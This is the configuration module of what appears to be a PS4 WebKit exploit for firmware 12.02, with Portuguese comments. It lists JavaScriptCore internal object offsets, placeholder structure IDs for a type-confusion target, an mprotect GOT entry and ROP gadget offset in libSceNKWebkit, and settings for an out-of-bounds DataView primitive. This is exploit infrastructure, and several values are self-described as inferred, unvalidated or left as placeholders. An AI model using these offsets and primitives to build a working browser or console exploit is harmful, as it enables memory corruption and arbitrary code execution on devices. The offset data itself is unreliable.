// js/config.mjs

// Firmware: PS4 12.02 (inferido)
// !! VOCÊ DEVE VALIDAR E REFINAR ESTES OFFSETS CUIDADOSAMENTE NO SEU DISASSEMBLER !!
export const JSC_OFFSETS = {
    JSCell: {
        STRUCTURE_POINTER_OFFSET: "0x8",
        STRUCTURE_ID_OFFSET: "0x00",
        FLAGS_OFFSET: "0x04"
    },
    Structure: {
        GLOBAL_OBJECT_OFFSET: "0x00",
        PROTOTYPE_OFFSET: "0x08",
        TYPE_INFO_FLAGS_OFFSET: "0x10",
        INDEXING_TYPE_AND_MISC_OFFSET: "0x18",
        CLASS_INFO_OFFSET: "0x1C",
        VIRTUAL_PUT_OFFSET: "0x18",
    },
    JSObject: {
        BUTTERFLY_OFFSET: "0x10", // Onde as propriedades nomeadas e elementos indexados são armazenados
    },
    ArrayBuffer: {
        CONTENTS_IMPL_POINTER_OFFSET: "0x10", // Ponteiro para ArrayBufferContents (m_impl)
        SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START: "0x18", // Tamanho do buffer visível para JS (m_byteLength em JSArrayBuffer)
        // SHARING_MODE_OFFSET: "0x28", // Se relevante
        // IS_RESIZABLE_FLAGS_OFFSET: "0x30" // Se relevante
    },
    ArrayBufferContents: { // Estrutura interna apontada por CONTENTS_IMPL_POINTER_OFFSET
        SIZE_IN_BYTES_OFFSET: "0x08" // VALIDE ESTE! Offset do campo de tamanho real (m_sizeInBytes) dentro de ArrayBufferContents
        // DATA_POINTER_OFFSET: "0x00" // VALIDE ESTE! Offset do ponteiro de dados (m_data) dentro de ArrayBufferContents. Frequentemente 0x0.
    },
    ArrayBufferView: { // Como DataView, Uint32Array
        STRUCTURE_ID_OFFSET: "0x00",
        FLAGS_OFFSET: "0x04",
        ASSOCIATED_ARRAYBUFFER_OFFSET: "0x08", // Ponteiro para o JSArrayBuffer.
        M_VECTOR_OFFSET: "0x10",               // Ponteiro para os dados (dentro do ArrayBuffer.m_impl->data()).
        M_LENGTH_OFFSET: "0x18",               // Comprimento da view.
        M_MODE_OFFSET: "0x1C"                  // Modo (ex: WastefulWriting).
    },
    JSFunction: {
        M_EXECUTABLE_OFFSET: "0x20",
        M_SCOPE_OFFSET: "0x28",
    },
    SymbolObject: {
        PRIVATE_SYMBOL_POINTER_OFFSET: "0x10",
    }
};

export const KNOWN_STRUCTURE_IDS = {
    TYPE_ARRAY_BUFFER: "0xFILL_ME_IN_ARRAYBUFFER_ID",
    TYPE_JS_FUNCTION: "0xFILL_ME_IN_JSFUNCTION_ID",
    TYPE_JS_OBJECT_GENERIC: "0xFILL_ME_IN_JSOBJECT_ID",
    TYPE_FAKE_TARGET_FOR_CONFUSION: "0xFILL_ME_IN_INTERESTING_TYPE_ID",
    TYPE_DATAVIEW: "0xFILL_ME_IN_DATAVIEW_ID",
};

export const WEBKIT_LIBRARY_INFO = {
    MODULE_NAME: "libSceNKWebkit.sprx",
    KNOWN_OFFSETS: {},
    GOT_ENTRIES: {
         "mprotect": "0x3CBD820",
    },
    FUNCTION_OFFSETS: {
        "JSC::JSFunction::create": "0x58A1D0",
        // ... (outros offsets de função)
        "gadget_lea_rax_rdi_plus_20_ret": "0x58B860",
    }
};

// Esta é a exportação crucial para OOB_CONFIG
export let OOB_CONFIG = {
    ALLOCATION_SIZE: 32768,     // Tamanho da janela do DataView OOB
    BASE_OFFSET_IN_DV: 128,     // Offset onde a DataView OOB começa dentro do ArrayBuffer real
    INITIAL_BUFFER_SIZE: 32     // Não usado diretamente no triggerOOB_primitive atual, mas pode ser para outros testes
};

export function updateOOBConfigFromUI(docInstance) {
    if (!docInstance) return;
    const oobAllocSizeEl = docInstance.getElementById('oobAllocSize');
    const baseOffsetEl = docInstance.getElementById('baseOffset');
    const initialBufSizeEl = docInstance.getElementById('initialBufSize');

    if (oobAllocSizeEl && oobAllocSizeEl.value !== undefined) {
        const val = parseInt(oobAllocSizeEl.value, 10);
        if (!isNaN(val) && val > 0) OOB_CONFIG.ALLOCATION_SIZE = val;
    }
    if (baseOffsetEl && baseOffsetEl.value !== undefined) {
        const val = parseInt(baseOffsetEl.value, 10);
        if (!isNaN(val) && val >= 0) OOB_CONFIG.BASE_OFFSET_IN_DV = val;
    }
    if (initialBufSizeEl && initialBufSizeEl.value !== undefined) {
        const val = parseInt(initialBufSizeEl.value, 10);
        if (!isNaN(val) && val > 0) OOB_CONFIG.INITIAL_BUFFER_SIZE = val;
    }
}
